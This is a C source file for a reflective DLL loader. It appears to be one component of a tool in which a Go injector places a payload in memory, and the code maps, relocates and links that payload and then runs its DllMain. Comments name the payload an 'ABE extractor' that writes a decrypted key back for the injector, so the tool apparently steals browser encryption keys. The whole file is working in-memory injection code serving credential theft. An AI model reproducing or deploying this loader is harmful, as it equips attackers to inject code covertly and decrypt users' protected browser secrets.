#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stddef.h>

#include "bootstrap.h"

typedef HMODULE (WINAPI *pfn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pfn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *pfn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pfn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG    (NTAPI  *pfn_NtFlushInstructionCache)(HANDLE, PVOID, ULONG);
typedef BOOL    (WINAPI *pfn_DllMain)(HINSTANCE, DWORD, LPVOID);

typedef struct {
    pfn_LoadLibraryA              LoadLibraryA;
    pfn_GetProcAddress            GetProcAddress;
    pfn_VirtualAlloc              VirtualAlloc;
    pfn_VirtualProtect            VirtualProtect;
    pfn_NtFlushInstructionCache   NtFlushInstructionCache;
} resolved_imports;

#define MARK(imgBase, step) do { \
    *(volatile BYTE *)((BYTE *)(imgBase) + BOOTSTRAP_MARKER_OFFSET) = (BYTE)(step); \
} while (0)

// noinline is load-bearing: if this gets inlined into Bootstrap,
// __builtin_return_address(0) returns the thread stub (ntdll) instead
// of an address inside our payload — the backward MZ scan would then
// walk the wrong module and crash.
static __attribute__((noinline)) ULONG_PTR get_caller_ip(void)
{
    return (ULONG_PTR)__builtin_return_address(0);
}

// locate_own_image_base walks backwards from the return IP of the calling
// frame until it hits a valid MZ/PE header. Must not be inlined (see
// get_caller_ip above).
static ULONG_PTR locate_own_image_base(void)
{
    ULONG_PTR imageBase = get_caller_ip();
    while (imageBase > 0) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            LONG lfanew = dos->e_lfanew;
            if (lfanew > 0 && lfanew < 0x1000) {
                PIMAGE_NT_HEADERS64 nt =
                    (PIMAGE_NT_HEADERS64)(imageBase + (ULONG_PTR)lfanew);
                if (nt->Signature == IMAGE_NT_SIGNATURE) return imageBase;
            }
        }
        imageBase--;
    }
    return 0;
}

// read_preresolved_imports pulls the five function pointers the Go injector
// patched into the payload's DOS stub (see patchPreresolvedImports on the
// Go side). Returns FALSE if any slot is NULL — indicating a build-stub
// mismatch between C and Go.
static BOOL read_preresolved_imports(ULONG_PTR imageBase, resolved_imports *out)
{
    out->LoadLibraryA =
        *(pfn_LoadLibraryA *)(imageBase + BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET);
    out->GetProcAddress =
        *(pfn_GetProcAddress *)(imageBase + BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET);
    out->VirtualAlloc =
        *(pfn_VirtualAlloc *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET);
    out->VirtualProtect =
        *(pfn_VirtualProtect *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET);
    out->NtFlushInstructionCache =
        *(pfn_NtFlushInstructionCache *)(imageBase + BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET);

    return out->LoadLibraryA && out->GetProcAddress && out->VirtualAlloc &&
           out->VirtualProtect && out->NtFlushInstructionCache;
}

// allocate_and_copy_image reserves a fresh RW region and copies the raw
// payload bytes (headers + every section) into it. Returns the new base
// plus a pointer to the NT headers within the new image, or NULL on
// VirtualAlloc failure.
static BYTE *allocate_and_copy_image(ULONG_PTR oldBase,
                                      const resolved_imports *imp,
                                      PIMAGE_NT_HEADERS64 *outNewNt)
{
    PIMAGE_DOS_HEADER oldDos = (PIMAGE_DOS_HEADER)oldBase;
    PIMAGE_NT_HEADERS64 oldNt =
        (PIMAGE_NT_HEADERS64)(oldBase + (ULONG_PTR)oldDos->e_lfanew);
    SIZE_T sizeOfImage = oldNt->OptionalHeader.SizeOfImage;

    BYTE *newBase = (BYTE *)imp->VirtualAlloc(
        NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!newBase) return NULL;

    BYTE *headerSrc = (BYTE *)oldBase;
    DWORD headerSize = oldNt->OptionalHeader.SizeOfHeaders;
    for (DWORD i = 0; i < headerSize; i++) {
        newBase[i] = headerSrc[i];
    }

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(oldNt);
    for (WORD i = 0; i < oldNt->FileHeader.NumberOfSections; i++) {
        BYTE *sSrc = (BYTE *)oldBase + sec[i].PointerToRawData;
        BYTE *sDst = newBase + sec[i].VirtualAddress;
        DWORD raw = sec[i].SizeOfRawData;
        for (DWORD j = 0; j < raw; j++) {
            sDst[j] = sSrc[j];
        }
    }

    *outNewNt =
        (PIMAGE_NT_HEADERS64)(newBase + (ULONG_PTR)oldDos->e_lfanew);
    return newBase;
}

// apply_base_relocations fixes up 64-bit absolute address references in
// the copied image if the new base differs from the preferred ImageBase.
static void apply_base_relocations(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt)
{
    LONG_PTR delta = (LONG_PTR)newBase - (LONG_PTR)newNt->OptionalHeader.ImageBase;
    DWORD relocSize = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    DWORD relocRva = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (delta == 0 || relocSize == 0 || relocRva == 0) return;

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(newBase + relocRva);
    DWORD consumed = 0;
    while (reloc->VirtualAddress && consumed < relocSize) {
        DWORD count =
            (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries =
            (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD j = 0; j < count; j++) {
            WORD type = entries[j] >> 12;
            WORD offset = entries[j] & 0x0FFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONG_PTR *target = (ULONG_PTR *)(newBase +
                    reloc->VirtualAddress + offset);
                *target += (ULONG_PTR)delta;
            }
        }
        consumed += reloc->SizeOfBlock;
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE *)reloc + reloc->SizeOfBlock);
    }
}

// link_iat resolves the Import Address Table for each DLL the payload
// references, using the pre-resolved LoadLibraryA + GetProcAddress the
// Go injector patched in.
static void link_iat(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
                     const resolved_imports *imp)
{
    DWORD impSize = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    DWORD impRva = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (impSize == 0 || impRva == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR desc =
        (PIMAGE_IMPORT_DESCRIPTOR)(newBase + impRva);
    while (desc->Name) {
        const char *modName = (const char *)(newBase + desc->Name);
        HMODULE hMod = imp->LoadLibraryA(modName);
        if (hMod) {
            DWORD origRva = desc->OriginalFirstThunk
                ? desc->OriginalFirstThunk : desc->FirstThunk;
            PIMAGE_THUNK_DATA origThunk =
                (PIMAGE_THUNK_DATA)(newBase + origRva);
            PIMAGE_THUNK_DATA thunk =
                (PIMAGE_THUNK_DATA)(newBase + desc->FirstThunk);
            while (origThunk->u1.AddressOfData) {
                FARPROC fn;
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    fn = imp->GetProcAddress(hMod,
                        (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)
                        (newBase + origThunk->u1.AddressOfData);
                    fn = imp->GetProcAddress(hMod, ibn->Name);
                }
                thunk->u1.Function = (ULONG_PTR)fn;
                origThunk++;
                thunk++;
            }
        }
        desc++;
    }
}

// set_section_protections applies final per-section memory protections
// (.text → RX, .rdata → R, .data → RW) based on IMAGE_SCN_MEM_* flags.
static void set_section_protections(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
                                     const resolved_imports *imp)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(newNt);
    for (WORD i = 0; i < newNt->FileHeader.NumberOfSections; i++) {
        DWORD newProtect = PAGE_READONLY;
        DWORD ch = sec[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = (ch & IMAGE_SCN_MEM_WRITE)
                ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (ch & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        }
        DWORD oldProtect = 0;
        imp->VirtualProtect(newBase + sec[i].VirtualAddress,
                            sec[i].Misc.VirtualSize,
                            newProtect, &oldProtect);
    }
}

// invoke_dllmain calls the payload's DllMain with DLL_PROCESS_ATTACH.
// lpReserved carries the original raw-image base so DllMain (= the ABE
// extractor entry) can write the decrypted key back into the scratch
// region the Go injector reads.
static ULONG_PTR invoke_dllmain(BYTE *newBase, PIMAGE_NT_HEADERS64 newNt,
                                 ULONG_PTR scratchBase)
{
    pfn_DllMain pDllMain =
        (pfn_DllMain)(newBase + newNt->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, (LPVOID)scratchBase);
    return (ULONG_PTR)newBase;
}

__declspec(dllexport) ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter)
{
    ULONG_PTR imageBase = locate_own_image_base();
    if (imageBase == 0) return 0;
    MARK(imageBase, BOOTSTRAP_MARK_MZ_FOUND);

    resolved_imports imp;
    if (!read_preresolved_imports(imageBase, &imp)) {
        MARK(imageBase, BOOTSTRAP_MARK_ERR_IMPORTS);
        return 0;
    }
    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_OK);

    PIMAGE_NT_HEADERS64 newNt;
    BYTE *newBase = allocate_and_copy_image(imageBase, &imp, &newNt);
    if (!newBase) {
        MARK(imageBase, BOOTSTRAP_MARK_ERR_ALLOC);
        return 0;
    }
    MARK(imageBase, BOOTSTRAP_MARK_ALLOC_OK);
    MARK(imageBase, BOOTSTRAP_MARK_COPIED);

    apply_base_relocations(newBase, newNt);
    MARK(imageBase, BOOTSTRAP_MARK_RELOCATED);

    link_iat(newBase, newNt, &imp);
    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_FIXED);

    set_section_protections(newBase, newNt, &imp);
    MARK(imageBase, BOOTSTRAP_MARK_PERMISSIONS);

    imp.NtFlushInstructionCache((HANDLE)-1, NULL, 0);
    MARK(imageBase, BOOTSTRAP_MARK_CACHE_FLUSHED);

    ULONG_PTR result = invoke_dllmain(newBase, newNt, imageBase);
    MARK(imageBase, BOOTSTRAP_MARK_DONE);
    return result;
}
